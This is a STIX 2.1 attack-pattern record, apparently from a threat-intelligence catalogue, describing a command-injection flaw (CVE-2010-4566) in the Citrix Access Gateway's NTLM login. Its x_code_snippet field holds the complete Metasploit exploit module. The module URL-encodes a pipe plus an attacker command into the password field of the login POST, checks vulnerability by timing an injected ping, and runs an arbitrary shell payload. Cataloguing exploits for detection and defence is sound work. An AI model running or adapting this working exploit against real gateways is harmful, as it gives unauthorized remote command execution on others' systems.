{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d65b368-cf33-4878-bfde-6919ec6e18c9",
    "created": "2024-08-14T17:12:41.548441Z",
    "modified": "2024-08-14T17:12:41.548445Z",
    "name": "Citrix Access Gateway Command Execution",
    "description": " The Citrix Access Gateway provides support for multiple authentication types. When utilizing the external legacy NTLM authentication module known as ntlm_authenticator the Access Gateway spawns the Samba 'samedit' command line utility to verify a user's identity and password.  By embedding shell metacharacters in the web authentication form it is possible to execute arbitrary commands on the Access Gateway. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/citrix_access_gateway_exec.rb",
            "external_id": "citrix_access_gateway_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4566"
        },
        {
            "source_name": "reference",
            "url": "http://www.vsecurity.com/resources/advisory/20101221-1/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Citrix Access Gateway Command Execution',\n      'Description'    => %q{\n          The Citrix Access Gateway provides support for multiple authentication types.\n        When utilizing the external legacy NTLM authentication module known as\n        ntlm_authenticator the Access Gateway spawns the Samba 'samedit' command\n        line utility to verify a user's identity and password.  By embedding shell\n        metacharacters in the web authentication form it is possible to execute\n        arbitrary commands on the Access Gateway.\n      },\n      'Author'         =>\n        [\n          'George D. Gal', # Original advisory\n          'Erwin Paternotte', # Exploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-4566' ],\n          [ 'OSVDB', '70099' ],\n          [ 'BID', '45402' ],\n          [ 'URL', 'http://www.vsecurity.com/resources/advisory/20101221-1/' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 127,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              #'RequiredCmd' => 'generic telnet bash-tcp'\n            }\n        },\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 30\n        },\n      'Platform'       => [ 'unix' ],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2010-12-21',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [ true, 'Use SSL', true ]),\n      ])\n\n  end\n\n  def post(command, background)\n    username = rand_text_alphanumeric(20)\n\n    if background\n      sploit = Rex::Text.uri_encode('|' + command + '&')\n    else\n      sploit = Rex::Text.uri_encode('|' + command)\n    end\n\n    data = \"SESSION_TOKEN=1208473755272-1381414381&LoginType=Explicit&username=\"\n    data << username\n    data << \"&password=\"\n    data << sploit\n\n    res = send_request_cgi({\n      'uri'     => '/',\n      'method'  => 'POST',\n      'data'    => data\n    }, 25)\n  end\n\n  def check\n    print_status(\"Attempting to detect if the Citrix Access Gateway is vulnerable...\")\n\n    # Try running/timing 'ping localhost' to determine is system is vulnerable\n    start = Time.now\n    post(\"ping -c 10 127.0.0.1\", false)\n    elapsed = Time.now - start\n    if elapsed >= 3\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    cmd = payload.encoded\n\n    if not post(cmd, true)\n      fail_with(Failure::Unknown, \"Unable to execute the desired command\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-12-21",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}